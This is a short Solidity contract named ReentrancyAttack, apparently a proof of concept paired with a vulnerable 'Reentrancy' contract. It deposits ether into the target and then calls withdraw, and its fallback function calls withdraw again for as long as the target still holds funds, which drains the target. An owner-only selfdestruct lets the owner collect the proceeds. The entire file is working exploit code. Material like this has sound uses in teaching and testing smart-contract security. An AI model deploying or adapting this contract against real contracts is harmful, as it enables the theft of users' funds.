pragma solidity ^0.4.23;

import "./Reentrancy.sol";

contract ReentrancyAttack {

    address public owner;

    Reentrancy public token;

    constructor(address _token) public {
        owner = msg.sender;
        token = Reentrancy(_token);
    }

    function kill () public {
        require(msg.sender == owner);
        selfdestruct(msg.sender);
    }

    function put() public payable {
        token.put.value(msg.value)();
        token.withdraw();
    }

    function () external payable {
        if (address(token).balance >= msg.value) {
            token.withdraw();
        }
    }
}
